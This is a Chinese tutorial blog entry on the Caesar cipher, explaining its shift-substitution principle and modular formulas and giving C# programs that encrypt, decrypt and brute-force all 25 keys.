        <content type="html"><![CDATA[<h1 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h1><p>​        根据罗马早期纪传体作者<strong>盖乌斯·苏维托尼乌斯</strong>的记载，<strong>凯撒大帝</strong>曾用一种移位的方式对军事信息进行加密，后人称这种加密方式为凯撒加密。<strong>凯撒密码</strong>是一种<strong>替换加密</strong>的方案，<strong>明文</strong>中所有字母都在<strong>字母表</strong>上向后(或向前)按照一个固定数目进行偏移后被替换成<strong>密文</strong>。</p><h1 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h1><p>​        <strong>凯撒加密</strong>：</p><p>​        将<strong>26个字母</strong>按顺序进行排列并形成环，将每一位英文字母用其前面(或后面)的第k位字母来表示，替换之后形成新的字符串即为密文。</p><p>​        <strong>举个栗子</strong>：</p><p>​        当明文为：T，偏移量为：3时，使用CeasarCipher如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CeasarCipher/CeasarCipher.png" alt="CeasarCipher"></center><p>​        以单表替换的角度来解释即为：</p><p>​        明文字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ</p><p>​        密文字母表：DEFGHIJKLMNOPQRSTUVWXYZABC</p><p>​        明文字母表与密文字母表存在上下的一一对应。当明文为T时，对应密文字母表中的W；解密时也按照一一对应的关系找到每个密文对应的明文即可。</p><p>​        <strong>数学语言描述</strong>：</p><ol><li>首先将字母用数字代替，即：A=0，B=1，C=2，…，Z=25。</li><li>明文空间记为：M</li><li>密文空间记为：C</li><li>密钥空间记为：K<del>m</del></li><li>将偏移量记为：k</li><li>加密操作记为：E<del>(m)</del></li><li>解密操作记为：D<del>(c)</del></li></ol><p>则有：</p><p><strong>加密变换</strong>：<br>$$<br>E_(m_) = (m + k) \ mod \ 26 \ \   ,(m∈M，k∈K)<br>$$<br><strong>解密变换</strong>：<br>$$<br>D_(c_) = (c - k) \ mod \ 26  ,\ \ \  (c∈C，k∈K)<br>$$<br><font color="red">其中：明文空间M、密文空间C、密钥空间K<del>m</del>相同都为模26的余数集合</font></p><h1 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h1><p><strong>程序流程图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CeasarCipher/CeasarCipherFlowchart.png" alt="CeasarCipherFlowchart"></center><p>注：</p><ul><li><p>第一次输入一个int型数据op，若<code>op==1</code>则执行加密操作，若<code>op==0</code>则执行解密操作，否则结束程序。</p></li><li><p>第二次输入一个字符串，进行加密或解密操作。</p></li><li><p>操作结果后显示加密或解密的结果。</p></li></ul><h1 id="编程实现"><a href="#编程实现" class="headerlink" title="编程实现"></a>编程实现</h1><p><strong>Ceasar类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> DemoCeasar<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Ceasar</span>    <span class="token punctuation">{</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 加密操作</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Ceasar加密操作</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="plaintext">明文)&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="key">密钥(1-25)&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>密文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">EnCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> plaintext<span class="token punctuation">,</span> <span class="token keyword">int</span> key<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span> ciphertext <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">string</span> str<span class="token punctuation">;</span>            str <span class="token operator">=</span> plaintext<span class="token punctuation">.</span><span class="token function">ToUpper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword">char</span> ch <span class="token keyword">in</span> str<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>ch <span class="token operator">>=</span> <span class="token string">'A'</span> <span class="token operator">&amp;&amp;</span> ch <span class="token operator">&lt;=</span> <span class="token string">'Z'</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    ciphertext <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">+</span> <span class="token punctuation">(</span>ch <span class="token operator">-</span> <span class="token string">'A'</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token number">26</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    ciphertext <span class="token operator">+</span><span class="token operator">=</span> ch<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> ciphertext<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Avocat加密（密钥为10）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="plaintext">明文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>密文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">AvocatEnCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> plaintext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">EnCrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// ROT13加密（密钥为13）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="plaintext">明文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>密文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">ROT13EnCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> plaintext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">EnCrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Cassis加密（密钥为-5）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="plaintext">明文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>密文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">CassisEnCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> plaintext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">EnCrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Cassette加密（密钥为-6）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="plaintext">明文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>密文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">CassetteEnCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> plaintext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">EnCrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 解密操作</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Ceasar解密操作</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="ciphertext">密文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="key">密钥(1-25)&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>明文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">DeCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> ciphertext<span class="token punctuation">,</span> <span class="token keyword">int</span> key<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span> plaintext <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">string</span> str<span class="token punctuation">;</span>            str <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span><span class="token function">ToUpper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token keyword">char</span> ch <span class="token keyword">in</span> str<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>ch <span class="token operator">>=</span> <span class="token string">'A'</span> <span class="token operator">&amp;&amp;</span> ch <span class="token operator">&lt;=</span> <span class="token string">'Z'</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    plaintext <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">+</span> <span class="token punctuation">(</span>ch <span class="token operator">-</span> <span class="token string">'A'</span> <span class="token operator">-</span> key <span class="token operator">+</span> <span class="token number">26</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    plaintext <span class="token operator">+</span><span class="token operator">=</span> ch<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> plaintext<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Avocat解密（密钥为10）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="ciphertext">密文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>明文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">AvocatDeCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> ciphertext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">DeCrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// ROT13解密（密钥为13）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="ciphertext">密文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>明文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">ROT13DeCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> ciphertext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">DeCrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Cassis解密（密钥为-5）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="ciphertext">密文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>明文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">CassisDeCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> ciphertext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">DeCrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Cassette解密（密钥为-6）</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="ciphertext">密文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>明文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">CassetteDeCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> ciphertext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">DeCrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Ceasar类核心解读：</p><p>​        在ceasar中理解的字母表是一个转轮的形式，但在实际的存储中而是以线性方式存储，所有在本代码中通过使用《初等数论》中的<strong>模运算</strong>来得到移位后的字母。（全部以<strong>“A”</strong>为基准）</p><ol><li>得到<strong>给定字母</strong>与“A”的偏移量</li><li>计算<strong>移位后</strong>对“A”的偏移量</li><li><font color="red">在取模之前先加上一个基数，使之前的计算结果全部以转化为正数</font></li><li><strong>取模运算</strong>得到目标字母相对于“A”的偏移量</li><li>得到相对于“A”偏移字母的ASCII码并将其<strong>强制转化为字母</strong></li></ol><p><strong>Program测试类：</strong></p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> DemoCeasar<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span>Title <span class="token operator">=</span> <span class="token string">"欢迎使用Ceasar"</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"请输入您期望的操作：(1:加密,0:解密)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">string</span> str <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> op<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token function">TryParse</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token keyword">out</span> op<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                Ceasar ceasar <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ceasar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"请输入明文：(字母串)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">string</span> plaintext <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"请输入密钥:(整数)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">int</span> key <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token string">'0'</span><span class="token punctuation">;</span>                    <span class="token keyword">string</span> ciphertext <span class="token operator">=</span> ceasar<span class="token punctuation">.</span><span class="token function">EnCrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"{0}加密之后的密文为:{1}"</span><span class="token punctuation">,</span>plaintext<span class="token punctuation">,</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>op <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"请输入密文：(字母串)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">string</span> ciphertext <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"请输入密钥:(整数)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">int</span> key <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token string">'0'</span><span class="token punctuation">;</span>                    <span class="token keyword">string</span> plaintext <span class="token operator">=</span> ceasar<span class="token punctuation">.</span><span class="token function">DeCrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"输入错误程序终止!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            Console<span class="token punctuation">.</span><span class="token function">ReadKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id="结果显示"><a href="#结果显示" class="headerlink" title="结果显示"></a>结果显示</h1><p><strong>加密操作</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CeasarCipher/EnCrypt.png" alt="EnCrypt"></center><p><strong>解密操作</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CeasarCipher/DeCrypt.png" alt="DeCrypt"></center><h1 id="密码分析"><a href="#密码分析" class="headerlink" title="密码分析"></a>密码分析</h1><p>​        Ceasar密码作为经典的加密算法，在罗马时期有很好的应用。其明文空间M、密文空间C、密钥空间K<del>m</del>相同都为模26的余数集合，也即其加密的密钥有25种情况(<font color="blue">0不计算在内</font>)，通过枚举密钥的方式揣测明文。</p><h2 id="穷举搜索"><a href="#穷举搜索" class="headerlink" title="穷举搜索"></a>穷举搜索</h2><p><strong>CrackSeasar类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> Crack_Seasar<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CrackSeasar</span>    <span class="token punctuation">{</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 枚举检索</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 枚举搜索</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="ciphertext">密文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回可能的明文字符串组&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">EnumerativeSearch</span><span class="token punctuation">(</span><span class="token keyword">string</span> ciphertext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> plaintext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">string</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">string</span> str <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span><span class="token function">ToUpper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 枚举解密</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> key <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> key <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> key<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token keyword">char</span> ch <span class="token keyword">in</span> str<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">>=</span> <span class="token string">'A'</span> <span class="token operator">&amp;&amp;</span> ch <span class="token operator">&lt;=</span> <span class="token string">'Z'</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        plaintext<span class="token punctuation">[</span>key <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">+</span> <span class="token punctuation">(</span>ch <span class="token operator">-</span> <span class="token string">'A'</span> <span class="token operator">-</span> key <span class="token operator">+</span> <span class="token number">26</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span>                    <span class="token punctuation">{</span>                        plaintext<span class="token punctuation">[</span>key <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> ch<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> plaintext<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>Program测试类</strong>：</p><pre class=" language-csahrp"><code class="language-csahrp">using System;namespace Crack_Seasar{    class Program    {        static void Main(string[] args)        {            Console.Title = "CrackSear";            Console.WriteLine("请输入待破解密文：");            string ciphertext = Console.ReadLine();            // 枚举搜索            CrackSeasar crackSeasar = new CrackSeasar();            string[] plaintext = crackSeasar.EnumerativeSearch(ciphertext);            // Display            for(int i = 0;i < 25;i++)            {                Console.WriteLine("key:{0} \t -> \t {1}", i + 1, plaintext[i]);            }            Console.ReadKey();        }    }}</code></pre><p><strong>测试结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CeasarCipher/EnumerativeSearch1.png" alt="EnumerativeSearch1"></center><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>参考链接</strong>：</p><p><a href="https://baike.baidu.com/item/恺撒密码/4905284?fromtitle=%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81&fromid=1336345&fr=aladdin" target="_blank" rel="noopener">凯撒密码-百度百科</a></p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8639300.html" target="_blank" rel="noopener">凯撒密码加解密即破解实现原理</a></p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
          <category> 古典密码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ceasar </tag>
            
            <tag> 密码学 </tag>
            
            <tag> 古典密码 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
